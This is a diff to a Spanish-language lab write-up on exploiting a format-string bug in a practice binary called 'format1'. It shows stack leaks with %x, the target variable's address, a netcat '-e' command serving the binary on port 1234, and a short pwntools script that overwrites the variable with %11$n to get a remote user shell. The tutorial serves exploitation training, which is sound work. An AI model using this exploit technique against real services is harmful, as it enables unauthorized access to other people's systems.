@@ -594,10 +594,51 @@ Pero vamos a explotar el binario sin necesidad de modificarlo, debido a que en l
 Violación de segmento
 </code></pre>
 Ocurre esto debido a que pasamos dos argumentos que en realidad no existen en el código. Estos téstigo de formato son simplemente argumentos que va a recibir la función cuando sea llamada con <code>call</code> siendo unos punteros en el stack que apuntan a una dirección de memoria cuyo contenido sería por ejemplo si es un testigo de formato de tipo cadena <code>%s</code> pues una string.
-Por regla general los argumentos que recibe una función pueden ser cadenas, variables o direcciones de memoria. En el stack podemos tener direcciones de memoria o contenido, incluso direcciones de memoria que apuntan a una dirección del stack. Para esta pequeña PoC vamos a enviar un pequeño buffer de <code>AAAA</code> y al final obtenedremos con el valor en hexadecimal de estos valores. Si usamos el testigo de formato <code>%x</code> obtenemos un volcado de la memoria:
+Por regla general los argumentos que recibe una función pueden ser cadenas, variables o direcciones de memoria. En el stack podemos tener direcciones de memoria o contenido, incluso direcciones de memoria que apuntan a una dirección del stack. 
+<p><em><strong>Explotación</strong></em></p>
+Para esta pequeña PoC vamos a enviar un pequeño buffer de <code>AAAA</code> y al final obtenedremos con el valor en hexadecimal de estos valores. Si usamos el testigo de formato <code>%x</code> obtenemos un volcado de la memoria:
 <pre><code>naivenom@parrot:[~/pwn/format1] $ ./format1 
 AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
 AAAA.ffc85f5c.00000050.000000c2.00000000.00c30000.00000000.ffc86054.00000000.00000000.00000041.41414141.3830252e
 3!
 </code></pre>
+Vemos que al número de argumento <code>11</code> obtenemos el contenido en hexadecimal de nuestra cadena.
+Ahora el siguiente paso sería encontrar la variable <code>x=3</code> en la sección <code>data</code>.
+<pre><code>[0x0804854d]> px@0x804a02c
+- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
+0x0804a02c  0300 0000 0000 0000 0000 0000 0000 0000  ................
+</code></pre>
+Por último, teniendo la dirección de memoria de la variable de tipo <code>int</code> solo nos hace falta hacer nuestro pequeño exploit y como el salto condicional nos indica que el registro <code>$eax</code> tiene que ser igual a la variable que es == 4, ya lo tenemos hecho!. Solo tenemos que escribir en la memoria usando python por ejemplo con <code>print</code> 4 Bytes, el número de argumentos necesarios hasta llegar en este caso <code>11</code> y el testigo de formato <code>%n</code> para que escribir un valor entero en esa dirección de memoria de la variable. El valor sería lo que printea, osea 4 Bytes <code>\x2c\xa0\x04\x08</code>.
+<p><em><strong>Obteniendo user shell</strong></em></p>
+El usuario <code>guille</code> esta ejecutando en el servidor un binario vulnerable a format string por el puerto <code>1234</code>.
+<pre><code>$ nc -lvnp 1234 -e ./format1
+listening on [any] 1234 ...
+connect to [192.168.32.129] from (UNKNOWN) [192.168.32.142] 32850
+</code></pre>
+Ejecutamos nuestro exploit y ganamos acceso como user del servidor.
+<pre><code>naivenom@parrot:[~/pwn/format1] $ python exploit.py 
+[+] Opening connection to 192.168.32.129 on port 1234: Done
+[*] Switching to interactive mode
+$ id
+uid=998(guille) gid=997(guille) grupos=997(guille)
+</code></pre>
 <h4>[Comandos]:</h4>
+Seguridad del binario.
+<pre><code>gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre>
+<h4>[Exploit Development]:</h4>
+Exploit remoto.
+<div style="background: #ffffff; overflow:auto;width:auto;"><pre style="margin: 0; line-height: 125%"><span style="color: #000080; font-weight: bold">from</span> pwn <span style="color: #000080; font-weight: bold">import</span> *
+
+p = remote(<span style="color: #0000FF">&#39;192.168.32.129&#39;</span>, <span style="color: #0000FF">1234</span>)
+exploit = <span style="color: #0000FF">&quot;&quot;</span>
+exploit += <span style="color: #0000FF">&quot;\x2c\xa0\x04\x08%11$n&quot;</span>
+p.sendline(exploit)
+
+p.interactive()
+</pre></div>
